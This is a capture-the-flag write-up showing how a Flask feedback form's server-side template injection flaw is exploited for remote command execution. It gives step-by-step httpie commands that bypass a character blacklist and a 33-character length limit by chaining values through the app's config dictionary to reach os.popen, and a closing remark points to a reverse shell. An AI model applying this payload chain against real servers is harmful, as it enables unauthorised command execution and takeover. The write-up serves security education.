# Writeup for EPT CTF feedback form

The goal in this challenge is the get RCE and execute the `/flag` file to get the flag.
By looking at the code we notice something strange:

```python
@app.route('/success', methods=['POST'])
def success():
    name = request.form.get('name')
    challengequality = request.form.get('challengequality')
    othercomments = request.form.get('othercomments')
     
    if name:
        bad_chars = [*"'_#&;"]
        if any(char in bad_chars for char in name):
            random.shuffle(bad_chars)
            flash(f"The following characters are not allowed: {''.join(bad_chars)}")
            app.logger.warning(f"Filtered: {name}")
            return redirect(url_for('index'))
        elif len(name)>33:
            flash(f"Name max length is 33")
            app.logger.warning(f"Name length restriction")
            return redirect(url_for('index'))
        #saving feedback to db
        if challengequality:
            open('/dev/null', 'w').write(challengequality)
        if othercomments:
            open('/dev/null', 'w').write(othercomments)
        app.logger.warning(name)
        template = open('templates/success.html', 'r').read()
        template = template.replace("{{ name }}", name)
        return render_template_string(template)
    else:
        return redirect(url_for('index'))
```

Instead of rendering from a template file, the app opens the template file and replaces "{{ name }}" with the `name` variable before calling `render_template_string`.
This is very unsafe to do, since it makes it vulnerable to server side template injection attacks (SSTI).

If we set the name param to `{{ 6*6 }}` the website shows

![](https://i.imgur.com/GOu7769.png)


We can also see in the code that there is a length limit for the name variable. Only 33 characters are allowed.. Server side template injection code for Jinja2 (template engine) usually needs
to be quite long in order to get RCE, so this limit will be a big challenge for us.

There are also a list with bad characters we are not allowed to include in the name parameter. Since the "_" character is blacklisted, we cannot use attributes like "__class__" or "__globals__",
which one usually need to find functions that can lead to RCE.

Let's split this problem up into two: Length limit and blacklist bypass

## Blacklist bypass
Since only the name parameter is being checked for bad characters, we can create our own param (a) and fetch the value using `request.args.a`
```html
$ http --form http://io5.ept.gg:32625/success a==__globals__ name={{request.args.a}}

<h1 class="display-6 fw-bold">Thank you for the feedback __globals__</h1>
<p> We read all feedback carefully! </p>
```

The blacklist has been bypassed as we can see `__globals__` in our response.

## Length limit bypass
The length limit is harder to bypass, and we did not find any cheesy way to do this. However, we found a way to store our variables permanently, so that we could use those values in the next requests.
A Flask app always has a `config` dictionary contains all of the configurations for the application. We have access to this from the template engine, and can store values there by updating the dict.
The config dictionary can be reached from Jinja2 as `config`. Let's try to update it with our own value, by using request.args.

```console
$ http --form http://io5.ept.gg:32625/success a==__globals__ name="{{config.update(request.args)}}"

$ http --form http://io5.ept.gg:32625/success a==__globals__ name="{{config.a}}"
> Thank you for the feedback __globals__
```

When we try to get `config.a` we can now see the value we wrote to the config is `__globals__`.

The plan is to find a short payload which gives us RCE, and then slowly but steady build it by using `config` as temporal storage. A short payload we can use is
`{{ lipsum.__globals__.os.popen("/flag").read() }}`

For every attribute or method we access, we can store it in config under a new key. Then we can use the new key to store the next attribute in the config.
This way we will eventually reach `popen` and can then execute our command.

The only problem about this is the length limit, since `{{config.update(b=lipsum[config.a])}}` 37 characters...
But what if we update the config with a key `b` that is `config.update`? Then we can just use `config.b` instead of `config.update` and we got a shorter payload.

Since `{{config.update(b=config.update)}}` is too long, we can put `config.update` in a variable first and then use that variable 2 times. We an do this using `{% set %}` in Jinja2:
`{%set x=config.update%}{{x(b=x)}}` is 33 characters exactly, so this will work!

```console
$ http --form http://io5.ept.gg:32625/success a==__globals__ name="{%set x=config.update%}{{x(b=x)}}"
```

After doing this we can store the first part of our payload `lipsum.__globals__` in config.c:
```console
$ http --form http://io5.ept.gg:32625/success name="{{config.b(c=lipsum[config.a])}}"
```

then we store `os` in config.d:
```console
$ http --form http://io5.ept.gg:32625/success name="{{config.b(d=config.c.os)}}"
```

Our final store is `popen` which gets stored in config.e:
```console
$ http --form http://io5.ept.gg:32625/success name="{{config.b(e=config.d.popen)}}"
```

At last we can now run the `/flag` program, so let's complete the challenge :)

```console
$ http --form http://io5.ept.gg:32625/success name='{{config.e("/flag").read()}}'

> Thank you for the feedback EPT{H0w_sh0rt_w4s_y0ur_p4yl0ad?}
```

Flag: `Thank you for the feedback EPT{H0w_sh0rt_w4s_y0ur_p4yl0ad?}`

PS: Since we can store URL params in config, we can store a really long command that gets executed, like for example a reverse shell to get full access on this server :)